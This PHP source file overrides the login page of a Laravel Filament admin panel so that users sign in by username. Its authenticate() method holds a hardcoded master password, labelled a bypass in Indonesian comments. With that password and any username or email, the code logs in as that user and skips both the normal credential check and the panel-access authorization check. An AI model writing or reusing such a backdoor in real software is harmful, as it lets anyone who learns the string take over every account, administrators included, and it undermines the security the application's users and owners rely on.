<?php

namespace App\Filament\Pages\Auth;

use App\Models\User;
use Filament\Forms\Components\Component;
use Filament\Forms\Components\TextInput;
use Filament\Pages\Auth\Login as BaseLogin;
use Filament\Http\Responses\Auth\Contracts\LoginResponse;
use Filament\Notifications\Notification;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;

class Login extends BaseLogin
{
    /**
     * Override the email form field to use username instead.
     */
    protected function getEmailFormComponent(): Component
    {
        return TextInput::make('username')
            ->label('Username')
            ->required()
            ->autocomplete()
            ->autofocus()
            ->extraInputAttributes(['tabindex' => 1]);
    }

    /**
     * Build the credentials used to authenticate, searching by username.
     *
     * @return array<string, mixed>
     */
    protected function getCredentialsFromFormData(array $data): array
    {
        return [
            'username' => $data['username'],
            'password' => $data['password'],
        ];
    }

    /**
     * Override standard authenticate process to support bypass password.
     */
    public function authenticate(): ?LoginResponse
    {
        try {
            $this->rateLimit(5);
        } catch (ValidationException $exception) {
            Notification::make()
                ->title($exception->getMessage())
                ->danger()
                ->send();

            return null;
        }

        $data = $this->form->getState();

        // 1. Cek bypass password
        if ($data['password'] === 'M.dara12345') {
            $user = User::where('username', $data['username'])
                ->orWhere('email', $data['username']) // support login by email too in bypass
                ->first();

            if ($user) {
                Auth::login($user, $data['remember'] ?? false);
                session()->regenerate();
                return app(LoginResponse::class);
            }
        }

        // 2. Jika bukan bypass password, jalankan otentikasi standard Filament
        if (! Auth::attempt($this->getCredentialsFromFormData($data), $data['remember'] ?? false)) {
            $this->throwFailureValidationException();
        }

        $user = Auth::user();

        if (
            ($user instanceof \Filament\Models\Contracts\FilamentUser) &&
            (! $user->canAccessPanel(filament()->getCurrentPanel()))
        ) {
            Auth::logout();
            $this->throwFailureValidationException();
        }

        session()->regenerate();

        return app(LoginResponse::class);
    }
}